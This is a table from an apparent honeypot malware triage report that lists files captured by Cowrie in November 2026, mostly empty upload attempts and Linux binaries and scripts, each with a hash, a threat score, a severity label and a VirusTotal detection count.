| `20261109-203632-372bc8ada403-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__home__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-224501-d46112a542ed-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__home__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-043100-8831e91a1437-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__home__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261110-170207-d5ab2615a19e-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20bf791cbff215fbf7a1aa7cc5c50f4ff39f06ae4823e898dc6d885fa4b79b87` | Unknown binary | `20bf791cbff215fb...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `20d4672f40c452d53b41227f669c481703677e302954c52158515f7003d2fb27` | ELF Binary (Linux executable) (ARM 32-bit) | `20d4672f40c452d5...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `24c6257e3d107cee1ab5ad97495bb06298c9ae917d3edfe7435b027609078c4f` | Unknown binary | `24c6257e3d107cee...` | 10/100 | 🟢 LOW | **1/75** 🔴 |
| `25ab82b4c64b0cb8e7d7ca400f593943e3e6eb7a9be5830e5e40c42588aec2ac` | Unknown binary | `25ab82b4c64b0cb8...` | 0/100 | 🟢 LOW | Not in VT |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2923ea4ee6579db31e6fb4e28c12b39785ed25d8a5994a7c8f3de199f7933f9a` | Shell Script | `2923ea4ee6579db3...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **42/75** 🔴 |
| `2bc4637dff3dadfbc9a6117d2cc5de6115ca287ba5ded3373ebae9e75cb35713` | Unknown binary | `2bc4637dff3dadfb...` | 0/100 | 🟢 LOW | Not in VT |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `2c11e0112a88768036cb6dd4e0a6a77af2969f7132b69aa147862496dcb39fbe` | ELF Binary (Linux executable) (x86-64 64-bit) | `2c11e0112a887680...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `30201674d6926d471a4039f9968be90f27a30f64097eca078f2a8ff320d7f0a7` | Bash Script | `30201674d6926d47...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `30e0cb05a8c207c4084adaeb2906cbb8119b3d638999a73d4635e333e09cc0f6` | ELF Binary (Linux executable) (ARM 32-bit) | `30e0cb05a8c207c4...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `31384110975802292bbfa8301113a4bb857cc1acb8b820e5459eab283646d79a` | ELF Binary (Linux executable) (x86-64 64-bit) | `3138411097580229...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 56/100 | 🟡 MEDIUM | **16/75** 🔴 |
| `32995ee3a0858c8c7f5594aa1bb4d38de616d66d60b920c5ffefe9bb41fccf38` | Unknown binary | `32995ee3a0858c8c...` | 18/100 | 🟢 LOW | **21/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **41/75** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3644ec3990ecae5fd2187e5bf75c9e30e970c2fb232d5c0114350802b8661231` | Unknown binary | `3644ec3990ecae5f...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `364f6761862e789ae340cf92caca2f55bb3130846071546d717dc93173526242` | Bash Script | `364f6761862e789a...` | 58/100 | 🟡 MEDIUM | **21/75** 🔴 |
| `36e70b9c5271aefeb3e4b4bc0eff8e81683f0ddfea4deed55dbc4cc0567ca179` | ELF Binary (Linux executable) (x86-64 64-bit) | `36e70b9c5271aefe...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `36fc4d5ed8fa4c31a5f17aba983958388fae85a9c03dbc1b43011ff77185f522` | ELF Binary (Linux executable) (x86-64 64-bit) | `36fc4d5ed8fa4c31...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `378d2c4805956c99701a68bc06c815ca60cd73d0bf2c675a1090ecfea1aa5156` | ELF Binary (Linux executable) (ARM 32-bit) | `378d2c4805956c99...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `382cabe7fb30d763748a2dcdc4629a46e10d5b8ac0303987293f55c6f3b339e7` | Unknown binary | `382cabe7fb30d763...` | 0/100 | 🟢 LOW | Not in VT |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `39be6853a8204ce6455a373a6ffb4cb4672d4a62d90be69f7d6eeb66cda10b96` | Shell Script | `39be6853a8204ce6...` | 62/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `3a713c5ce832c00a959f2603dd757e453c5b4b01b3d2f528ee4636db8c012777` | ELF Binary (Linux executable) (AArch64 64-bit) | `3a713c5ce832c00a...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3ad4623159f9ed44faf44b3881af95d4f363d76416958a6529bda733faff96da` | ELF Binary (Linux executable) (MIPS 32-bit) | `3ad4623159f9ed44...` | 30/100 | 🟢 LOW | Not in VT |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3d45b21019c355301c08b9670ccbc5c2b5df4ca9c1ead11e49229eb2737bd4bc` | Unknown binary | `3d45b21019c35530...` | 0/100 | 🟢 LOW | Not in VT |
| `3dafebce7434991783231e900ba15d6e07dcc289b5cdcd1591917e1b1f5c7271` | Bash Script | `3dafebce74349917...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `3e5586f6993bed97ae83472729a872385ddfde061e3c9eed7fbdeb401b738fde` | ELF Binary (Linux executable) (ARM 32-bit) | `3e5586f6993bed97...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `3e724458a4b817aad81a70746f397fc4830da3ab02d465f53dcf8e6af9a8391e` | ELF Binary (Linux executable) (ARM 32-bit) | `3e724458a4b817aa...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `3f17516cc8a591208afb7c49e156643dee6428a238b1d50a7be0443f4a866d24` | Shell Script | `3f17516cc8a59120...` | 71/100 | 🔴 HIGH | **3/75** 🔴 |
| `3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892` | Bash Script | `3f3a11bafabb1a35...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39` | ELF Binary (Linux executable) (RISC-V 64-bit) | `3f3bf218089d1488...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `4079145398fad617557fdc44e63c49edbaeafb3744f1804aec0e430214e397b8` | ELF Binary (Linux executable) (ARM 32-bit) | `4079145398fad617...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 64/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `42390022ffee42dc52a3e497721342ee32cd5b3fe8d5af54709deb1eeca89151` | Unknown binary | `42390022ffee42dc...` | 55/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `434b4bd4fa61e03e74cb82fbeaa2e75b80c0bfb42a7ef916a71375267cd6a5c2` | ELF Binary (Linux executable) (x86-64 64-bit) | `434b4bd4fa61e03e...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `44272f1f153709662b3b973e7b4a601df852e7eae3dd9a22661860394889b1eb` | ELF Binary (Linux executable) (x86 32-bit) | `44272f1f15370966...` | 38/100 | 🟢 LOW | **22/75** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `44fcd7a6a61dd418b64fd2fa3e0048d139740bf74a77d261a6900e24609e83f6` | ELF Binary (Linux executable) (x86 32-bit) | `44fcd7a6a61dd418...` | 40/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `45075a965b00a8f0248dd4f40ea3621d58cefad5329ac86bf42caacc95729090` | ELF Binary (Linux executable) (ARM 32-bit) | `45075a965b00a8f0...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `458d7842b8088eef0dfcfb7b03c3f796e0b774cd970c6799dcb140dedb1e5756` | ELF Binary (Linux executable) (x86-64 64-bit) | `458d7842b8088eef...` | 30/100 | 🟢 LOW | Not in VT |
| `46c10cf65045f2aef700bac3f5deb50470b24fb017995bc977185fc100bbdaf7` | ELF Binary (Linux executable) (ARM 32-bit) | `46c10cf65045f2ae...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `46e6ed3b45fdf4a7a94e0249204453a6f83fdc10eae6828f053477aec2a2032c` | Unknown binary | `46e6ed3b45fdf4a7...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `4714c4c2a345cb6eac9d5be5bf7c9c633234a24bd2ba43f88de2526a5d1bc450` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `4714c4c2a345cb6e...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `474f623e80f175b5b2045f46532d5fbeb901ab2c578b0e71b181e57a3d98ad83` | Bash Script | `474f623e80f175b5...` | 55/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `488cd4b95923b20587debbd1a747d9e04b85b3ff2b274e36660401e194576626` | ELF Binary (Linux executable) (ARM 32-bit) | `488cd4b95923b205...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 52/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `4a1349dfc0edd9acaaef62d11e4a3cde0ab4bc97db9cc8f993fa83f9de188f13` | Shell Script | `4a1349dfc0edd9ac...` | 50/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `4b54fc4e6f53c261daa502bbef8c08de4c7cbf2f92f94a2d5c2ce41225361e8b` | Unknown binary | `4b54fc4e6f53c261...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `4bc714131d389964606d473f119bda142164d1ad589cfc2acb7ed63575c4f37d` | Unknown binary | `4bc714131d389964...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `4c3c2e01b3418659c8e05b8b93986ecb08c675f610f26bcd3471aaebbdd6849e` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `4c3c2e01b3418659...` | 55/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `4c463687adab59995dc46225c0df38a12da6ffd828b1a46a162e75ba604897ad` | ELF Binary (Linux executable) (ARM 32-bit) | `4c463687adab5999...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `4c9fbc49a110945822d0417d93159ff42700db00783697b500174b7d3fb9a8e3` | Bash Script | `4c9fbc49a1109458...` | 66/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `4cd88f5819fa89655b2f1c55312d25acea99bc0c276fce6969ee2c306bf9dc61` | ELF Binary (Linux executable) (ARM 32-bit) | `4cd88f5819fa8965...` | 40/100 | 🟡 MEDIUM | Not in VT |
| `4d69afe32d396ef8edfb757361c6b7230c36fa76abd0b4ed44b63d16e5e3efc9` | ELF Binary (Linux executable) (x86-64 64-bit) | `4d69afe32d396ef8...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `4e0618541b8213d6b93fbe491d53094242da39f1a3d8fb6edc9687af13b4de60` | Shell Script | `4e0618541b8213d6...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `4ec8d28a905d70c8b6cda812f9a627350c851b3e18d1ee0839b8833080fd9dab` | ELF Binary (Linux executable) (x86-64 64-bit) | `4ec8d28a905d70c8...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `5003d4cf1849fc207f3023b7220800f998cc34ec416ca3525f2707711258b98a` | ELF Binary (Linux executable) (ARM 32-bit) | `5003d4cf1849fc20...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `51b052a524af278366fb5527d4a5eee949b63f85168c37d4f97aefe3e73fe66a` | ELF Binary (Linux executable) (x86-64 64-bit) | `51b052a524af2783...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `51caf63a51a28343a2766566ece2c8d83725de5000c5420ccf491bb5bf2ebe39` | ELF Binary (Linux executable) (ARM 32-bit) | `51caf63a51a28343...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `52038cfc082ec409184c9a6a13956416a79adbd0b14976c0c7fd461b1051941f` | ELF Binary (Linux executable) (x86-64 64-bit) | `52038cfc082ec409...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 54/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `52996f9d9cbdf0ab4c83a465fcea2839e73d3356a298a8e9f7a96cc9b6e70126` | Unknown binary | `52996f9d9cbdf0ab...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 46/100 | 🟡 MEDIUM | **41/75** 🔴 |
| `5361e27991d07d66fadbf106e4e847f5418be99e4cef7b71b9928e980000dea6` | Unknown binary | `5361e27991d07d66...` | 0/100 | 🟢 LOW | Not in VT |
| `5492f9606bf12add8b8414b224e8272b7d422baedbd951e8874a4bda0cb716bc` | ELF Binary (Linux executable) (ARM 32-bit) | `5492f9606bf12add...` | 51/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `561b9327e87addc615ec1c93342af9227faf8bc904218ad513cf86b8ff26a467` | Shell Script | `561b9327e87addc6...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `5752ae9a94cebf686664cdbf5cb88f7c53a1cd70947934a0958992bd98b532f4` | Bash Script | `5752ae9a94cebf68...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `57de376767a78229701434a2efe5d6410132b208417e8d9fc0891405dfc7be09` | ELF Binary (Linux executable) (RISC-V 64-bit) | `57de376767a78229...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `57f23cc6bcf9cc5955922d4d09c854567897e66d550673ce16cd55ff395f1421` | ELF Binary (Linux executable) (AArch64 64-bit) | `57f23cc6bcf9cc59...` | 30/100 | 🟢 LOW | Not in VT |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b` | Bash Script | `586960df8bf559ff...` | 76/100 | 🔴 HIGH | **41/75** 🔴 |
| `588390c5d2115707e120fd4286c61216ca80b02f33610669875083edf1671262` | ELF Binary (Linux executable) (ARM 32-bit) | `588390c5d2115707...` | 70/100 | 🔴 HIGH | Not in VT |
| `591e135c571321fed659c2d5a763a4685333e2b1bccd35d19e51a1196878c01f` | ELF Binary (Linux executable) (ARM 32-bit) | `591e135c571321fe...` | 84/100 | 🔴 HIGH | **35/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `59efbc56d210575f2f3a4ca620c68650b18911b391f134d0a90a59d212dd7201` | ELF Binary (Linux executable) (x86-64 64-bit) | `59efbc56d210575f...` | 33/100 | 🟢 LOW | **9/75** 🔴 |
| `5a85f6400740f096bfa7a7bf8ad7439a6c44dee83336701daca96b47c3e1472e` | ELF Binary (Linux executable) (ARM 32-bit) | `5a85f6400740f096...` | 70/100 | 🔴 HIGH | Not in VT |
| `5b73969e4df42bd57becfd96fdc5ce13873c48995a19a877bf3030e1399fbf2c` | Shell Script | `5b73969e4df42bd5...` | 71/100 | 🔴 HIGH | **3/75** 🔴 |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `5decc8b46b6d027bca1e9f87db87d61c25ad177fe8dbba9bbac611323167fc87` | Unknown binary | `5decc8b46b6d027b...` | 0/100 | 🟢 LOW | Not in VT |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 65/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `5f5c6ab2eb5b79a9ce1ca4560c7425c9cb6ccb2a37998d9f43217b84247a4c36` | ELF Binary (Linux executable) (x86-64 64-bit) | `5f5c6ab2eb5b79a9...` | 31/100 | 🟢 LOW | **3/75** 🔴 |
| `603dd8562b98ed7e13618d591a2d359f02a3d33b5b8787435aaa0d06f2bf1451` | Unknown binary | `603dd8562b98ed7e...` | 55/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `60bd55de5316f67e270f1e4bccc1254748dff438bc41e473735a9d3f497c5773` | ELF Binary (Linux executable) (AArch64 64-bit) | `60bd55de5316f67e...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `60c3986439f423123eeb6e04e04dac447883863fe79dd8b664283cc4d20ec96d` | ELF Binary (Linux executable) (ARM 32-bit) | `60c3986439f42312...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `6137211b79c71309fcfb1688aa91d00b1bbf9f8d0fadd85d7df6fe32632fd4ba` | Bash Script | `6137211b79c71309...` | 61/100 | 🟡 MEDIUM | **29/75** 🔴 |
